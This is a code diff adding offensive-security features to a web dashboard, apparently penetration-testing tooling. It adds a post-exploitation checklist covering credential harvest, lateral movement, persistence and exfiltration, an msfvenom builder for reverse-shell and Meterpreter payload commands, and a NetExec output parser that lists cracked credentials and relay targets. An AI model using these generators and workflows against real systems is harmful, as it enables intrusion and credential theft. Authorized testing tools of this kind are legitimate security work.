@@ -390,9 +390,11 @@ function switchPage(pageId) {
   if (pageId === 'tokenUsage') loadTokenUsage()
   if (pageId === 'costs') loadCosts()
   if (pageId === 'ideas') loadIdeasPage()
+  if (pageId === 'postex') loadPostexPage()
   if (pageId === 'archived') loadArchivedPage()
   if (pageId === 'naplo') loadNaplo()
   if (pageId === 'federation') loadFederationPage()
+  if (pageId === 'tools') initToolsPage()
 }
 
 // Mobile off-canvas sidebar toggle. No-op visual effect on desktop (the
@@ -432,9 +434,9 @@ const SIDEBAR_GROUPS_LS_KEY = 'wraith.sidebarGroups'
 // naplo under system) or relabeling a group is a one-line change right here.
 const SIDEBAR_GROUPS = [
   { key: 'team',        labelKey: 'nav.group.team',        pages: ['agents', 'activity', 'messages', 'tasks', 'bgTasks'] },
-  { key: 'knowledge',   labelKey: 'nav.group.knowledge',   pages: ['memories', 'skills', 'research', 'ideas'] },
+  { key: 'knowledge',   labelKey: 'nav.group.knowledge',   pages: ['memories', 'skills', 'research', 'ideas', 'postex'] },
   { key: 'stats',       labelKey: 'nav.group.stats',       pages: ['costs', 'tokenUsage'] },
-  { key: 'system',      labelKey: 'nav.group.system',      pages: ['status', 'naplo', 'updates', 'settings', 'vault'] },
+  { key: 'system',      labelKey: 'nav.group.system',      pages: ['status', 'naplo', 'updates', 'settings', 'vault', 'tools'] },
   { key: 'connections', labelKey: 'nav.group.connections', pages: ['connectors', 'federation', 'migrate'] },
 ]
 const sidebarGroupEls = document.querySelectorAll('.sb-group[data-group]')
@@ -558,6 +560,7 @@ const PAGE_HEADER_I18N = {
   costsPage:      { title: 'costs.page_title',       sub: 'costs.page_subtitle' },
   federationPage: { title: 'federation.page_title',  sub: 'federation.page_subtitle' },
   approvalsPage:  { title: 'approvals.page_title',   sub: 'approvals.page_subtitle' },
+  toolsPage:      { title: 'Tools',                  sub: null },
 }
 
 function renderStaticI18n() {
@@ -16622,4 +16625,499 @@ async function openResearchDoc(agent, name) {
 
   window._initGanttViewSwitcher = initGanttViewSwitcher
   window.renderGantt = renderGantt
+})()
+
+// ══════════════════════════════════════════════════════════════════════════════
+// POST-EX CHECKLIST PAGE
+// ══════════════════════════════════════════════════════════════════════════════
+const POSTEX_CAT_LABELS = {
+  enum: 'Enumeration', privesc: 'Privilege Escalation', cred: 'Credential Harvest',
+  lateral: 'Lateral Movement', persistence: 'Persistence', exfil: 'Exfiltration', ad: 'Active Directory',
+}
+const POSTEX_PRIV_BADGE = {
+  user: '#6b7280', sudo: '#f59e0b', root: '#ef4444', 'local-admin': '#f97316', system: '#ef4444', 'domain-admin': '#8b5cf6',
+}
+
+let _postexCurrentSession = null
+
+async function loadPostexPage() {
+  _postexCurrentSession = null
+  document.getElementById('postexDetailPanel').hidden = true
+  document.getElementById('postexSessionList').style.display = 'flex'
+
+  const list = document.getElementById('postexSessionList')
+  list.innerHTML = '<div style="color:var(--text-muted);font-size:13px">Töltés…</div>'
+
+  const res = await fetch('/api/postex/sessions')
+  if (!res.ok) { list.innerHTML = '<div style="color:var(--danger)">Hiba a betöltésnél.</div>'; return }
+  const { sessions } = await res.json()
+
+  if (!sessions.length) {
+    list.innerHTML = '<div style="color:var(--text-muted);font-size:13px;padding:24px;text-align:center">Még nincs session. Kattints az "+ Új session" gombra.</div>'
+    return
+  }
+
+  list.innerHTML = sessions.map(s => {
+    const pct = s.total ? Math.round(s.completed / s.total * 100) : 0
+    const badgeColor = POSTEX_PRIV_BADGE[s.priv] || '#6b7280'
+    const osIcon = s.os === 'linux'
+      ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3"/></svg>'
+      : '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2"/></svg>'
+    return `<div class="card" style="padding:14px 16px;cursor:pointer;display:flex;align-items:center;gap:14px" data-session-id="${s.id}">
+      <div style="flex:1;min-width:0">
+        <div style="font-weight:600;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${s.label || s.target}</div>
+        <div style="font-size:12px;color:var(--text-muted);margin-top:2px;display:flex;gap:8px;align-items:center">
+          ${osIcon} ${s.target}
+          <span style="background:${badgeColor};color:#fff;border-radius:3px;padding:1px 5px;font-size:10px;font-weight:700">${s.priv}</span>
+          <span style="color:var(--text-muted)">${s.env}</span>
+        </div>
+      </div>
+      <div style="display:flex;align-items:center;gap:10px;flex-shrink:0">
+        <div style="font-size:12px;color:var(--text-muted)">${s.completed}/${s.total}</div>
+        <div style="width:80px;height:5px;background:var(--border);border-radius:3px;overflow:hidden">
+          <div style="height:100%;background:${pct===100?'#22c55e':'var(--accent)'};width:${pct}%"></div>
+        </div>
+        <div style="font-size:11px;color:${pct===100?'#22c55e':'var(--text-muted)'}">${pct}%</div>
+        <button class="postex-del-btn" data-session-id="${s.id}" style="background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:16px;padding:0 4px;line-height:1" title="Törlés">&times;</button>
+      </div>
+    </div>`
+  }).join('')
+
+  list.querySelectorAll('[data-session-id]:not(.postex-del-btn)').forEach(el => {
+    el.addEventListener('click', () => openPostexSession(el.dataset.sessionId))
+  })
+  list.querySelectorAll('.postex-del-btn').forEach(btn => {
+    btn.addEventListener('click', async (e) => {
+      e.stopPropagation()
+      if (!confirm('Törlöd ezt a session-t?')) return
+      await fetch(`/api/postex/sessions/${btn.dataset.sessionId}`, { method: 'DELETE' })
+      loadPostexPage()
+    })
+  })
+}
+
+async function openPostexSession(id) {
+  const res = await fetch(`/api/postex/sessions/${id}`)
+  if (!res.ok) return
+  const data = await res.json()
+  _postexCurrentSession = data
+
+  document.getElementById('postexSessionList').style.display = 'none'
+  const panel = document.getElementById('postexDetailPanel')
+  panel.hidden = false
+
+  const s = data.session
+  document.getElementById('postexDetailLabel').textContent = s.label || s.target
+  document.getElementById('postexDetailMeta').textContent = `${s.os} · ${s.priv} · ${s.env}`
+
+  const exportBtn = document.getElementById('postexExportBtn')
+  exportBtn.onclick = () => window.open(`/api/postex/sessions/${id}/export`, '_blank')
+
+  renderPostexChecklist(data)
+}
+
+function renderPostexChecklist(data) {
+  const { checklist, total, completed } = data
+  const pct = total ? Math.round(completed / total * 100) : 0
+  document.getElementById('postexProgressText').textContent = `${completed}/${total} (${pct}%)`
+  document.getElementById('postexProgressBar').style.width = pct + '%'
+
+  const container = document.getElementById('postexChecklist')
+  container.innerHTML = ''
+
+  for (const [cat, items] of Object.entries(checklist)) {
+    const catLabel = POSTEX_CAT_LABELS[cat] || cat.toUpperCase()
+    const catDone = items.filter(i => i.checked).length
+    const section = document.createElement('div')
+    section.className = 'card'
+    section.style.cssText = 'padding:0;overflow:hidden'
+    section.innerHTML = `
+      <div style="padding:10px 14px;background:var(--bg-secondary,var(--bg));border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;cursor:pointer" class="postex-cat-header">
+        <span style="font-weight:600;font-size:13px">${catLabel}</span>
+        <span style="font-size:12px;color:var(--text-muted)">${catDone}/${items.length}</span>
+      </div>
+      <div class="postex-cat-body" style="padding:4px 0">
+        ${items.map(item => `
+          <label style="display:flex;align-items:flex-start;gap:10px;padding:7px 14px;cursor:pointer;border-radius:4px;transition:background .15s" class="postex-item" data-key="${item.key}">
+            <input type="checkbox" ${item.checked ? 'checked' : ''} style="margin-top:2px;flex-shrink:0;accent-color:var(--accent)" data-key="${item.key}">
+            <span style="font-size:13px;${item.checked ? 'text-decoration:line-through;color:var(--text-muted)' : ''}">${item.label}</span>
+            ${item.lootRef ? `<span style="margin-left:auto;font-size:10px;color:var(--accent);white-space:nowrap">🔑 ${item.lootRef}</span>` : ''}
+          </label>
+        `).join('')}
+      </div>`
+    section.querySelector('.postex-cat-header').addEventListener('click', (e) => {
+      const body = section.querySelector('.postex-cat-body')
+      body.hidden = !body.hidden
+    })
+    section.querySelectorAll('input[type=checkbox]').forEach(cb => {
+      cb.addEventListener('change', async () => {
+        const key = cb.dataset.key
+        await fetch(`/api/postex/sessions/${_postexCurrentSession.session.id}/items/${key}`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ checked: cb.checked }),
+        })
+        const updated = await (await fetch(`/api/postex/sessions/${_postexCurrentSession.session.id}`)).json()
+        _postexCurrentSession = updated
+        renderPostexChecklist(updated)
+      })
+    })
+    container.appendChild(section)
+  }
+}
+
+// Wire up new session modal
+document.getElementById('postexNewBtn').addEventListener('click', () => {
+  document.getElementById('postexModalOverlay').classList.add('open')
+})
+document.getElementById('postexModalClose').addEventListener('click', () => {
+  document.getElementById('postexModalOverlay').classList.remove('open')
+})
+document.getElementById('postexModalCancelBtn').addEventListener('click', () => {
+  document.getElementById('postexModalOverlay').classList.remove('open')
+})
+document.getElementById('postexModalSaveBtn').addEventListener('click', async () => {
+  const target = document.getElementById('postexTargetInput').value.trim()
+  if (!target) { alert('Target mező kötelező!'); return }
+  const body = {
+    target,
+    label: document.getElementById('postexLabelInput').value.trim() || null,
+    os:   document.getElementById('postexOsInput').value,
+    priv: document.getElementById('postexPrivInput').value,
+    env:  document.getElementById('postexEnvInput').value,
+  }
+  const res = await fetch('/api/postex/sessions', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
+  })
+  if (!res.ok) { alert('Hiba a session létrehozásánál.'); return }
+  document.getElementById('postexModalOverlay').classList.remove('open')
+  document.getElementById('postexTargetInput').value = ''
+  document.getElementById('postexLabelInput').value = ''
+  const data = await res.json()
+  _postexCurrentSession = data
+  document.getElementById('postexSessionList').style.display = 'none'
+  document.getElementById('postexDetailPanel').hidden = false
+  const s = data.session
+  document.getElementById('postexDetailLabel').textContent = s.label || s.target
+  document.getElementById('postexDetailMeta').textContent = `${s.os} · ${s.priv} · ${s.env}`
+  document.getElementById('postexExportBtn').onclick = () => window.open(`/api/postex/sessions/${s.id}/export`, '_blank')
+  renderPostexChecklist(data)
+})
+document.getElementById('postexBackBtn').addEventListener('click', () => {
+  document.getElementById('postexDetailPanel').hidden = true
+  loadPostexPage()
+})
+
+// ═══════════════════════════════════════════════════════════════
+// TOOLS PAGE — String Encoder + msfvenom Generator
+// ═══════════════════════════════════════════════════════════════
+;(() => {
+  // ── String Encoder ──────────────────────────────────────────
+  const ENCODINGS = [
+    {
+      label: 'Base64',
+      encode: s => btoa(unescape(encodeURIComponent(s))),
+      decode: s => { try { return decodeURIComponent(escape(atob(s))) } catch { return '(invalid base64)' } },
+    },
+    {
+      label: 'URL encode',
+      encode: s => encodeURIComponent(s),
+      decode: s => { try { return decodeURIComponent(s) } catch { return '(invalid URL encoding)' } },
+    },
+    {
+      label: 'HTML entities',
+      encode: s => s.replace(/[&<>"'`]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#x27;','`':'&#x60;'}[c])),
+      decode: s => s.replace(/&amp;|&lt;|&gt;|&quot;|&#x27;|&#x60;/g, e => ({'&amp;':'&','&lt;':'<','&gt;':'>','&quot;':'"','&#x27;':"'",'&#x60;':'`'}[e])),
+    },
+    {
+      label: 'Hex',
+      encode: s => [...s].map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(' '),
+      decode: s => { try { return s.replace(/\s/g,'').match(/.{1,2}/g).map(h => String.fromCharCode(parseInt(h,16))).join('') } catch { return '(invalid hex)' } },
+    },
+    {
+      label: 'Unicode escape',
+      encode: s => [...s].map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,'0')}`).join(''),
+      decode: s => { try { return s.replace(/\\u([0-9a-fA-F]{4})/g, (_,h) => String.fromCharCode(parseInt(h,16))) } catch { return '(invalid unicode)' } },
+    },
+    {
+      label: 'ROT13',
+      encode: s => s.replace(/[a-zA-Z]/g, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0)-b+13)%26)+b) }),
+      decode: s => s.replace(/[a-zA-Z]/g, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0)-b+13)%26)+b) }),
+    },
+    {
+      label: 'Hex (0x prefix)',
+      encode: s => [...s].map(c => '0x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join(','),
+      decode: null,
+    },
+    {
+      label: 'Bin',
+      encode: s => [...s].map(c => c.charCodeAt(0).toString(2).padStart(8,'0')).join(' '),
+      decode: s => { try { return s.trim().split(/\s+/).map(b => String.fromCharCode(parseInt(b,2))).join('') } catch { return '(invalid binary)' } },
+    },
+  ]
+
+  function renderEncoderRow(enc, value) {
+    const encoded = (() => { try { return enc.encode(value) } catch(e) { return '(error)' } })()
+    return `<div style="display:flex;align-items:center;gap:8px;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:6px 10px">
+      <span style="font-size:10px;font-weight:700;color:var(--text-muted);min-width:110px;flex-shrink:0">${enc.label}</span>
+      <code style="flex:1;font-family:var(--font-mono);font-size:11px;color:var(--accent);word-break:break-all;overflow:hidden">${encoded.replace(/</g,'&lt;')}</code>
+      <button onclick="copyText(this,'${encodeURIComponent(encoded)}')" style="flex-shrink:0;background:transparent;border:1px solid var(--border);border-radius:3px;padding:2px 8px;font-size:10px;font-weight:700;color:var(--text-muted);cursor:pointer;white-space:nowrap">COPY</button>
+    </div>`
+  }
+
+  function updateEncoder() {
+    const input = document.getElementById('toolsEncoderInput')
+    const results = document.getElementById('toolsEncoderResults')
+    if (!input || !results) return
+    const val = input.value
+    if (!val) { results.innerHTML = '<p style="font-size:12px;color:var(--text-muted)">Írj be szöveget a fenti mezőbe…</p>'; return }
+    results.innerHTML = ENCODINGS.map(enc => renderEncoderRow(enc, val)).join('')
+  }
+
+  // ── msfvenom Generator ─────────────────────────────────────
+  const MSF_PAYLOAD_MAP = {
+    linux: {
+      reverse_tcp:              'linux/{arch}/shell_reverse_tcp',
+      reverse_https:            'linux/{arch}/shell/reverse_https',
+      bind_tcp:                 'linux/{arch}/shell_bind_tcp',
+      reverse_tcp_meterpreter:  'linux/{arch}/meterpreter/reverse_tcp',
+      reverse_https_meterpreter:'linux/{arch}/meterpreter/reverse_https',
+    },
+    windows: {
+      reverse_tcp:              'windows/{arch}/shell_reverse_tcp',
+      reverse_https:            'windows/{arch}/shell/reverse_https',
+      bind_tcp:                 'windows/{arch}/shell_bind_tcp',
+      reverse_tcp_meterpreter:  'windows/{arch}/meterpreter/reverse_tcp',
+      reverse_https_meterpreter:'windows/{arch}/meterpreter/reverse_https',
+    },
+    osx: {
+      reverse_tcp:              'osx/{arch}/shell_reverse_tcp',
+      reverse_tcp_meterpreter:  'osx/{arch}/meterpreter/reverse_tcp',
+      bind_tcp:                 'osx/{arch}/shell_bind_tcp',
+      reverse_https:            'osx/{arch}/shell/reverse_https',
+      reverse_https_meterpreter:'osx/{arch}/meterpreter/reverse_https',
+    },
+    android: {
+      reverse_tcp:              'android/meterpreter/reverse_tcp',
+      reverse_https:            'android/meterpreter/reverse_https',
+      bind_tcp:                 'android/meterpreter/bind_tcp',
+      reverse_tcp_meterpreter:  'android/meterpreter/reverse_tcp',
+      reverse_https_meterpreter:'android/meterpreter/reverse_https',
+    },
+  }
+
+  const MSF_EXT = { elf:'', exe:'.exe', raw:'', python:'.py', bash:'.sh', ps1:'.ps1', dll:'.dll' }
+
+  function buildMsfCmd() {
+    const lhost  = (document.getElementById('msfLhost')?.value  || '10.10.14.1').trim()
+    const lport  = (document.getElementById('msfLport')?.value  || '4444').trim()
+    const plat   = document.getElementById('msfPlatform')?.value || 'linux'
+    const arch   = document.getElementById('msfArch')?.value    || 'x64'
+    const ptype  = document.getElementById('msfPayload')?.value || 'reverse_tcp'
+    const fmt    = document.getElementById('msfFormat')?.value  || 'elf'
+
+    const payloadTpl = MSF_PAYLOAD_MAP[plat]?.[ptype] || `${plat}/${arch}/shell_reverse_tcp`
+    const payload = payloadTpl.replace('{arch}', arch)
+    const outfile = `payload${MSF_EXT[fmt] || ''}`
+    const isBind  = ptype.includes('bind')
+    const connStr = isBind
+      ? `LPORT=${lport}`
+      : `LHOST=${lhost} LPORT=${lport}`
+
+    return `msfvenom -p ${payload} ${connStr} -f ${fmt} -o ${outfile}`
+  }
+
+  function updateMsf() {
+    const out = document.getElementById('msfOutput')
+    if (out) out.textContent = buildMsfCmd()
+  }
+
+  window.copyMsfCmd = function copyMsfCmd() {
+    const cmd = document.getElementById('msfOutput')?.textContent || ''
+    if (!cmd) return
+    navigator.clipboard.writeText(cmd).then(() => {
+      const btn = document.getElementById('msfCopyBtn')
+      if (!btn) return
+      btn.textContent = 'COPIED!'
+      setTimeout(() => { btn.textContent = 'COPY' }, 1500)
+    }).catch(() => {
+      const btn = document.getElementById('msfCopyBtn')
+      if (btn) btn.textContent = 'ERR'
+    })
+  }
+
+  window.copyText = function copyText(btn, encodedText) {
+    const text = decodeURIComponent(encodedText)
+    navigator.clipboard.writeText(text).then(() => {
+      const orig = btn.textContent
+      btn.textContent = '✓'
+      setTimeout(() => { btn.textContent = orig }, 1200)
+    }).catch(() => {})
+  }
+
+  // ── Init ─────────────────────────────────────────────────────
+  let _toolsInited = false
+
+  function initToolsPage() {
+    if (!_toolsInited) {
+      _toolsInited = true
+      const inp = document.getElementById('toolsEncoderInput')
+      if (inp) inp.addEventListener('input', updateEncoder)
+      const msfInputs = ['msfLhost','msfLport','msfPlatform','msfArch','msfPayload','msfFormat']
+      msfInputs.forEach(id => document.getElementById(id)?.addEventListener('input', updateMsf))
+      msfInputs.forEach(id => document.getElementById(id)?.addEventListener('change', updateMsf))
+    }
+    updateEncoder()
+    updateMsf()
+  }
+
+  window.initToolsPage = initToolsPage
+})()
+
+// ═══════════════════════════════════════════════════════════════
+// NXC PARSER — NetExec / nxc output parser
+// ═══════════════════════════════════════════════════════════════
+;(() => {
+  function cmeStatusEl()  { return document.getElementById('cmeStatus') }
+  function cmeAlertsEl()  { return document.getElementById('cmeAlerts') }
+  function cmeSummaryEl() { return document.getElementById('cmeSummary') }
+  function cmeResultsEl() { return document.getElementById('cmeResults') }
+  function cmeInputEl()   { return document.getElementById('cmeInput') }
+
+  function renderSummary(s) {
+    if (!s) return ''
+    return `<div style="display:flex;flex-wrap:wrap;gap:8px;font-family:var(--font-mono);font-size:11px">
+      ${tile('Hoszt', s.hosts)}
+      ${tile('Pwned', s.pwned, '#ff4d6d')}
+      ${tile('Valid', s.valid, '#00ff87')}
+      ${tile('Failed', s.failed)}
+      ${tile('Relay target', s.relayTargets, '#ffb547')}
+      ${tile('Zárolt', s.lockedAccounts, '#b47fff')}
+      ${tile('Cred', s.creds, '#00d4ff')}
+    </div>`
+  }
+
+  function tile(label, val, color) {
+    const c = color || 'var(--text-muted)'
+    return `<div style="background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:4px 10px;text-align:center">
+      <div style="font-size:15px;font-weight:700;color:${c}">${val}</div>
+      <div style="font-size:9px;color:var(--text-muted);letter-spacing:.06em">${label.toUpperCase()}</div>
+    </div>`
+  }
+
+  function renderAlerts(data) {
+    const parts = []
+    if (data.lockedOutAlert)   parts.push(`<div style="background:#b47fff18;border:1px solid #b47fff;border-radius:4px;padding:6px 10px;font-size:12px;color:#b47fff;font-weight:600">⚠ ${data.lockedOutAlert}</div>`)
+    if (data.relayTargetAlert) parts.push(`<div style="background:#ffb54718;border:1px solid #ffb547;border-radius:4px;padding:6px 10px;font-size:12px;color:#ffb547;font-weight:600">🎯 ${data.relayTargetAlert}</div>`)
+    return parts.join('')
+  }
+
+  function renderTable(records) {
+    if (!records || !records.length) return '<p style="font-size:12px;color:var(--text-muted)">Nincs találat.</p>'
+
+    const rows = records.map(r => {
+      if (r.lineType === 'info') {
+        const signBadge = r.signingFalse
+          ? `<span style="background:#ffb54730;color:#ffb547;border:1px solid #ffb547;border-radius:3px;padding:1px 5px;font-size:9px;font-weight:700">RELAY TARGET</span>`
+          : r.signing === false ? '' : `<span style="font-size:10px;color:var(--text-muted)">signing:on</span>`
+        return `<tr style="opacity:.7">
+          <td><span style="font-size:10px;color:var(--text-muted)">${r.protocol}</span></td>
+          <td style="font-family:var(--font-mono);font-size:11px">${r.ip}</td>
+          <td style="font-family:var(--font-mono);font-size:11px">${r.hostname}</td>
+          <td>${r.domain}</td>
+          <td colspan="3" style="font-size:11px;color:var(--text-muted)">[host info] ${signBadge}</td>
+        </tr>`
+      }
+
+      const resultBadge = r.pwned
+        ? `<span style="background:#ff4d6d30;color:#ff4d6d;border:1px solid #ff4d6d;border-radius:3px;padding:1px 6px;font-size:9px;font-weight:700">PWNED</span>`
+        : r.lineType === 'success'
+          ? `<span style="background:#00ff8730;color:#00ff87;border:1px solid #00ff87;border-radius:3px;padding:1px 6px;font-size:9px;font-weight:700">VALID</span>`
+          : r.lockedOut
+            ? `<span style="background:#b47fff30;color:#b47fff;border:1px solid #b47fff;border-radius:3px;padding:1px 6px;font-size:9px;font-weight:700">LOCKED</span>`
+            : `<span style="font-size:9px;color:var(--text-muted)">${r.statusCode || 'FAIL'}</span>`
+
+      const secretCell = r.isHash
+        ? `<span style="font-family:var(--font-mono);font-size:10px;color:#ffb547">${r.secret.slice(0,24)}…</span>
+           <span style="font-size:9px;color:var(--text-muted);margin-left:4px">hashcat -m ${r.hashcatMode ?? '?'}</span>`
+        : `<span style="font-family:var(--font-mono);font-size:11px">${r.secret}</span>`
+
+      return `<tr>
+        <td><span style="font-size:10px;color:var(--text-muted)">${r.protocol}</span></td>
+        <td style="font-family:var(--font-mono);font-size:11px">${r.ip}</td>
+        <td style="font-family:var(--font-mono);font-size:11px">${r.hostname}</td>
+        <td style="font-size:11px">${r.domain ? r.domain+'\\'+r.username : r.username}</td>
+        <td>${secretCell}</td>
+        <td>${resultBadge}</td>
+        <td><button onclick="copyCmeCred('${encodeURIComponent(r.domain+'\\\\'+r.username+':'+r.secret)}')" style="background:transparent;border:1px solid var(--border);border-radius:3px;padding:1px 6px;font-size:9px;cursor:pointer;color:var(--text-muted)">COPY</button></td>
+      </tr>`
+    }).join('')
+
+    return `<table style="width:100%;border-collapse:collapse;font-size:12px">
+      <thead><tr style="font-size:9px;letter-spacing:.08em;color:var(--text-muted);border-bottom:1px solid var(--border)">
+        <th style="padding:4px 8px;text-align:left">PROTO</th>
+        <th style="padding:4px 8px;text-align:left">IP</th>
+        <th style="padding:4px 8px;text-align:left">HOST</th>
+        <th style="padding:4px 8px;text-align:left">USER</th>
+        <th style="padding:4px 8px;text-align:left">SECRET</th>
+        <th style="padding:4px 8px;text-align:left">RESULT</th>
+        <th></th>
+      </tr></thead>
+      <tbody>${rows}</tbody>
+    </table>`
+  }
+
+  window.copyCmeCred = function(encoded) {
+    navigator.clipboard.writeText(decodeURIComponent(encoded)).catch(() => {})
+  }
+
+  window.runCmeParse = async function() {
+    const raw = cmeInputEl()?.value?.trim()
+    if (!raw) return
+    const statusEl = cmeStatusEl()
+    if (statusEl) statusEl.textContent = 'Parsing…'
+    try {
+      const r = await fetch('/api/nxc/parse', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ raw }),
+      })
+      const data = await r.json()
+      if (cmeSummaryEl()) cmeSummaryEl().innerHTML = renderSummary(data.summary)
+      if (cmeResultsEl()) cmeResultsEl().innerHTML  = renderTable(data.records)
+      // alerts from summary
+      const alerts = []
+      if (data.summary?.lockedAccounts > 0)
+        alerts.push(`<div style="background:#b47fff18;border:1px solid #b47fff;border-radius:4px;padding:6px 10px;font-size:12px;color:#b47fff;font-weight:600">⚠ FIGYELEM: ${data.summary.lockedAccounts} ACCOUNT_LOCKED_OUT!</div>`)
+      if (data.summary?.relayTargets > 0) {
+        const relayIps = data.records.filter(r => r.signingFalse).map(r => r.ip).filter((v,i,a) => a.indexOf(v)===i).join(', ')
+        alerts.push(`<div style="background:#ffb54718;border:1px solid #ffb547;border-radius:4px;padding:6px 10px;font-size:12px;color:#ffb547;font-weight:600">🎯 Relay target (signing:False): ${relayIps}</div>`)
+      }
+      if (cmeAlertsEl()) cmeAlertsEl().innerHTML = alerts.join('')
+      if (statusEl) statusEl.textContent = `${data.records?.length ?? 0} sor feldolgozva`
+    } catch(e) {
+      if (statusEl) statusEl.textContent = 'Hiba: ' + e.message
+    }
+  }
+
+  window.runCmeImport = async function() {
+    const raw = cmeInputEl()?.value?.trim()
+    if (!raw) return
+    const statusEl = cmeStatusEl()
+    if (statusEl) statusEl.textContent = 'Importálás…'
+    try {
+      const r = await fetch('/api/nxc/import', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ raw }),
+      })
+      const data = await r.json()
+      if (cmeSummaryEl()) cmeSummaryEl().innerHTML = renderSummary(data.summary)
+      if (cmeAlertsEl())  cmeAlertsEl().innerHTML  = renderAlerts(data)
+      if (statusEl) statusEl.textContent =
+        `Import kész: ${data.import?.imported ?? 0} új, ${data.import?.skipped ?? 0} kihagyva`
+    } catch(e) {
+      if (statusEl) statusEl.textContent = 'Hiba: ' + e.message
+    }
+  }
 })()
